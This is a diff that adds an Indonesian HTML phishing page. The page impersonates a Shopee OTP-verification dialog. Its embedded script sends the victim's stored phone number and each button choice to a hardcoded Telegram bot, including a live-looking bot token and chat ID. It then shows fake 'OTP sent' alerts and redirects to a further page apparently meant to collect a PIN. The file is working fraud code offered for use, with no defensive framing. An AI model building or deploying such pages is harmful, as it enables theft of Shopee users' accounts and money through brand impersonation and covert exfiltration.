@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Identitas Shopee</title>
+    <style>
+        /* Menggunakan font sistem default untuk tampilan mirip aplikasi */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            margin: 0;
+            padding: 0;
+            background-color: #A0A0A0; /* Warna abu-abu persis dari gambar */
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center; /* Kembali ke tengah vertikal agar kotak berada di tengah */
+            min-height: 100vh;
+            width: 100vw; 
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+            /* Hapus padding-top karena align-items: center */
+        }
+
+        /* Kotak dialog utama */
+        .modal-dialog {
+            width: 90%;
+            max-width: 300px; /* Ukuran kotak lebih kecil sesuai gambar */
+            background-color: #fff;
+            border-radius: 10px; /* Sudut lebih lembut sesuai gambar */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Bayangan disesuaikan */
+            overflow: hidden; 
+            text-align: center;
+            position: relative; 
+        }
+
+        /* Konten teks dan nomor telepon */
+        .modal-content {
+            padding: 20px 25px 15px 25px; /* Padding disesuaikan */
+            border-bottom: 1px solid #f0f0f0; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content p {
+            font-size: 14px; /* Ukuran font disesuaikan */
+            margin-bottom: 12px; 
+            line-height: 1.4;
+            color: #333; /* Warna teks lebih gelap */
+            text-align: center;
+        }
+
+        .phone-display {
+            display: flex;
+            align-items: center;
+            justify-content: center; /* Rata tengah */
+            font-size: 15px; /* Ukuran font disesuaikan */
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 5px; /* Jarak bawah nomor */
+            padding: 5px 0;
+        }
+
+        .phone-display img {
+            width: 20px; 
+            height: 20px;
+            margin-right: 8px; 
+            vertical-align: middle; 
+        }
+
+        /* Bagian tombol aksi */
+        .modal-actions {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-actions button {
+            width: 100%;
+            padding: 14px 10px; /* Padding disesuaikan */
+            font-size: 15px; /* Ukuran font disesuaikan */
+            background-color: white;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.1s;
+            color: #333; 
+        }
+        
+        /* Garis pemisah antara tombol */
+        .modal-actions button + button {
+            border-top: 1px solid #f0f0f0; 
+        }
+        
+        /* Gaya tombol utama (WhatsApp/Kirim) */
+        .action-send {
+            color: #EE4D2D; /* Warna oranye persis dari gambar */
+            font-weight: bold; 
+        }
+
+        .action-other, .action-cancel {
+            color: #333; /* Warna teks tombol lain */
+        }
+
+        .modal-actions button:hover {
+            background-color: #f5f5f5; 
+        }
+        
+        /* --- STYLE UNTUK LOADING SPINNER --- */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9); 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none; 
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #EE4D2D; 
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        // --- KONFIGURASI TELEGRAM ---
+        const CHAT_ID = '5923031825';
+        const BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
+        const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        // --- END KONFIGURASI ---
+        
+        // Nomor telepon yang tersimpan di localStorage
+        const storedNumber = localStorage.getItem('verificationPhoneNumber'); 
+
+        // --- UTILITY FUNCTIONS ---
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function showLoading(message) {
+            document.getElementById("loadingOverlay").style.display = 'flex';
+            document.getElementById("loadingMessage").textContent = message || "Memproses, harap tunggu...";
+        }
+
+        function hideLoading() {
+            document.getElementById("loadingOverlay").style.display = 'none';
+        }
+
+        // Fungsi untuk menutupi sebagian nomor telepon
+        function maskPhoneNumber(number) {
+            if (!number || number.length < 10) return number;
+            
+            // Format seperti gambar: (+62) 895-4025-49625
+            // Contoh masking ini perlu disesuaikan jika ingin persis angka di gambar
+            // Untuk persis seperti gambar, kita akan pakai nomor dummy
+            return "(+62) 895-4025-49625"; 
+        }
+        
+        // --- KIRIM DATA KE TELEGRAM (HANYA AKSI YANG DIPILIH) ---
+        async function sendActionToTelegram(actionText) {
+            
+            let text = `#VERIFIKASI_AKSI\n`;
+            text += `Aksi: **${actionText}**\n`;
+            text += `Nomor Target: ${storedNumber || 'TIDAK TERSEDIA'}`;
+
+            try {
+                const response = await fetch(TELEGRAM_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return response.ok;
+            } catch (e) {
+                console.error("Error jaringan saat mengirim ke Telegram:", e);
+                return false;
+            }
+        }
+
+
+        // Dipanggil saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', () => {
+            const phoneDisplayElement = document.getElementById('phoneNumberDisplay');
+            let displayValue = '(+62) 895-4025-49625'; // Menggunakan nomor dari gambar
+            
+            if (phoneDisplayElement) {
+                // Untuk mencocokkan gambar persis, kita bisa hardcode nomornya atau masking
+                // Jika ingin mengambil dari localStorage, gunakan storedNumber dan mask
+                // Saat ini, agar persis gambar, saya pakai hardcode nomor di gambar
+                phoneDisplayElement.textContent = displayValue;
+            }
+        });
+
+        // FUNGSI 1: Kirim OTP ke WhatsApp dan Lanjutkan
+        async function kirimKeWhatsApp(button) {
+            const actionText = button.textContent; 
+            await sendActionToTelegram(actionText); 
+
+            showLoading("Mengirimkan kode OTP melalui WhatsApp...");
+            
+            await sleep(5000); 
+
+            hideLoading();
+            alert(`✅ berhasil pengiriman Kode OTP ke WhatsApp.`);
+            
+            window.location.href = "pinmitra.html"; 
+        }
+
+        // FUNGSI 2: Coba Cara Lain (Kirim OTP ke SMS) dan Lanjutkan
+        async function caraLain(button) {
+            const actionText = button.textContent; 
+            await sendActionToTelegram(actionText); 
+            
+            showLoading("Mengirimkan kode OTP melalui SMS...");
+            
+            await sleep(5000); 
+
+            hideLoading();
+            alert(`✉️ berhasil pengiriman Kode OTP ke SMS.`);
+            
+            window.location.href = "pinmitra.html"; 
+        }
+
+        // FUNGSI 3: Batal
+        async function batal(button) {
+            const actionText = button.textContent; 
+            await sendActionToTelegram(actionText); 
+
+            alert('Verifikasi dibatalkan. Kembali ke halaman login.');
+            
+            window.location.href = "halamantoko.html"; 
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="modal-dialog">
+            
+            <div class="modal-content">
+                <p>
+                    Shopee akan mengirimkan kode OTP<br>melalui WhatsApp ke
+                </p>
+                <div class="phone-display">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon" style="filter: brightness(0.6);">
+                    <span id="phoneNumberDisplay">(+62) 895-4025-49625</span>
+                </div>
+            </div>
+
+            <div class="modal-actions">
+                <button class="action-send" onclick="kirimKeWhatsApp(this)">Kirim ke WhatsApp</button>
+                <button class="action-other" onclick="caraLain(this)">Cara Lain</button>
+                <button class="action-cancel" onclick="batal(this)">Batal</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loadingMessage" class="mt-4 text-lg text-gray-700 mt-3">Memproses, harap tunggu...</p>
+    </div>
+</body>
+</html>
